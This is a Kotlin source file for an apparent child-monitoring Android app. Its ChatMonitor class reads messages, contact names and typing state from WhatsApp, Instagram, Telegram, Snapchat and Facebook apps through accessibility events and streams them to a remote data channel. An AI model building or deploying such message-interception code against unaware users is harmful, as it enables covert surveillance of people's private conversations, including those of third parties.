package nexus.android.child.components.chat

import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap
import kotlin.coroutines.CoroutineContext

/**
 * Production-grade ChatMonitor with proper message deduplication and conversation tracking.
 */
@Suppress("DEPRECATION")
class ChatMonitor private constructor(private val appContext: Context) : CoroutineScope {

    companion object {
        @Volatile private var _instance: ChatMonitor? = null
        fun init(context: Context) {
            _instance = ChatMonitor(context.applicationContext)
        }
        val instance: ChatMonitor
            get() = _instance ?: throw IllegalStateException("ChatMonitor not initialized")
            
        private const val TAG = "ChatMonitor"
    }

    private val job = SupervisorJob()
    override val coroutineContext: CoroutineContext = Dispatchers.IO + job

    // Monitored apps
    private val allowedPackages = setOf(
        "com.whatsapp",
        "com.instagram.android",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.facebook.orca",
        "com.facebook.katana"
    )
    
    private val appNames = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "org.telegram.messenger" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.facebook.orca" to "Messenger",
        "com.facebook.katana" to "Facebook"
    )

    // Configuration
    private val conversationDebounceMs = 500L  // Reduced for faster updates
    private val maxMessagesPerPayload = 50     // Send up to 50 messages per update
    
    // State tracking
    private val conversationStates = ConcurrentHashMap<String, ConversationState>()
    private val lastPayloadTime = ConcurrentHashMap<String, Long>()
    
    @Volatile private var dataClient: DataChannelClient? = null
    private val extractors = ConcurrentHashMap<String, ChatExtractor>()

    data class ConversationState(
        val seenMessageIds: MutableSet<String> = ConcurrentHashMap.newKeySet(),
        var lastContactName: String? = null,
        var lastTypingState: Boolean = false,
        var lastUpdateTs: Long = 0L
    )

    fun setDataChannelClient(client: DataChannelClient?) {
        dataClient = client
        Log.d(TAG, "DataChannel client ${if (client != null) "attached" else "detached"}")
    }

    fun registerExtractor(pkg: String, extractor: ChatExtractor) {
        extractors[pkg] = extractor
        Log.d(TAG, "Registered extractor for $pkg")
    }

    fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return

            if (!allowedPackages.contains(pkg)) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    launch { handleWindowStateChanged(pkg, event) }
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                    launch { handleContentChanged(pkg, event) }
                }
            }
        } catch (t: Throwable) {
            Log.e(TAG, "Event handling error", t)
        }
    }

    private suspend fun handleWindowStateChanged(pkg: String, event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val root = event.source ?: return@withContext
            try {
                val extractor = extractors[pkg] ?: GenericChatExtractor(pkg)
                
                // Check if this is a conversation view
                if (!extractor.isConversationView(root)) {
                    Log.d(TAG, "Not a conversation view, skipping")
                    return@withContext
                }
                
                val conversationId = extractor.extractConversationId(root) ?: return@withContext
                val contactName = extractor.extractContactName(root)
                val messages = extractor.extractVisibleMessages(root)
                
                // Send APP_OPENED event with visible messages
                sendConversationUpdate(
                    pkg = pkg,
                    conversationId = conversationId,
                    contactName = contactName,
                    messages = messages,
                    type = "APP_OPENED"
                )
                
            } catch (e: Exception) {
                Log.e(TAG, "handleWindowStateChanged error", e)
            } finally {
                root.recycle()
            }
        }
    }

    private suspend fun handleContentChanged(pkg: String, event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val root = event.source ?: return@withContext
            try {
                val extractor = extractors[pkg] ?: GenericChatExtractor(pkg)
                
                if (!extractor.isConversationView(root)) return@withContext
                
                val conversationId = extractor.extractConversationId(root) ?: return@withContext
                val contactName = extractor.extractContactName(root)
                
                // Apply debouncing per conversation
                val now = System.currentTimeMillis()
                val lastTime = lastPayloadTime[conversationId] ?: 0L
                if ((now - lastTime) < conversationDebounceMs) {
                    return@withContext
                }
                
                // Extract messages and typing state
                val messages = extractor.extractVisibleMessages(root)
                val isTyping = extractor.extractTypingState(root)
                
                // Get or create conversation state
                val state = conversationStates.getOrPut(conversationId) { ConversationState() }
                
                // Filter new messages (not seen before)
                val newMessages = messages.filter { msg ->
                    !state.seenMessageIds.contains(msg.msgId)
                }
                
                // Update seen messages
                newMessages.forEach { state.seenMessageIds.add(it.msgId) }
                
                // Limit seen messages to prevent memory growth (keep last 200 per conversation)
                if (state.seenMessageIds.size > 200) {
                    val toRemove = state.seenMessageIds.size - 200
                    state.seenMessageIds.take(toRemove).forEach { state.seenMessageIds.remove(it) }
                }
                
                // Send updates
                if (newMessages.isNotEmpty()) {
                    lastPayloadTime[conversationId] = now
                    state.lastContactName = contactName
                    state.lastUpdateTs = now
                    
                    sendConversationUpdate(
                        pkg = pkg,
                        conversationId = conversationId,
                        contactName = contactName,
                        messages = newMessages.take(maxMessagesPerPayload),
                        type = "CONVERSATION_UPDATE"
                    )
                }
                
                // Send typing indicator if changed
                if (isTyping != state.lastTypingState) {
                    state.lastTypingState = isTyping
                    sendTypingIndicator(pkg, conversationId, contactName, isTyping)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "handleContentChanged error", e)
            } finally {
                root.recycle()
            }
        }
    }

    private fun sendConversationUpdate(
        pkg: String,
        conversationId: String,
        contactName: String?,
        messages: List<MessageData>,
        type: String
    ) {
        if (!ChatController.isMonitoringEnabled()) return
        
        val payload = ChatPayload(
            childId = getChildId(),
            type = type,
            data = ChatPayloadData(
                app = pkg,
                appName = appNames[pkg] ?: pkg,
                conversationId = conversationId,
                contactName = contactName,
                messages = messages,
                conversationMeta = ConversationMeta(
                    lastActivityTs = System.currentTimeMillis()
                )
            )
        )
        
        sendPayload(payload)
    }
    
    private fun sendTypingIndicator(
        pkg: String,
        conversationId: String,
        contactName: String?,
        isTyping: Boolean
    ) {
        if (!ChatController.isMonitoringEnabled()) return
        
        val payload = ChatPayload(
            childId = getChildId(),
            type = "TYPING_INDICATOR",
            data = ChatPayloadData(
                app = pkg,
                appName = appNames[pkg] ?: pkg,
                conversationId = conversationId,
                contactName = contactName,
                isTyping = isTyping
            )
        )
        
        sendPayload(payload)
    }

    private fun sendPayload(payload: ChatPayload) {
        val json = ChatJson.toJson(payload)
        val client = dataClient
        
        val sent = try {
            client?.send(json) ?: false
        } catch (t: Throwable) {
            Log.e(TAG, "sendPayload error", t)
            false
        }
        
        if (sent) {
            Log.d(TAG, "✅ Sent ${payload.type} for ${payload.data.appName} (${payload.data.messages.size} messages)")
        } else {
            Log.w(TAG, "⚠️ Failed to send payload - DataChannel not ready")
        }
    }

    private fun getChildId(): String {
        return try {
            val prefs = appContext.getSharedPreferences("phantom_prefs", Context.MODE_PRIVATE)
            prefs.getString("device_id", "CHILD-UNKNOWN") ?: "CHILD-UNKNOWN"
        } catch (_: Throwable) {
            "CHILD-UNKNOWN"
        }
    }

    fun shutdown() {
        Log.d(TAG, "Shutting down ChatMonitor")
        conversationStates.clear()
        lastPayloadTime.clear()
        job.cancel()
    }
}
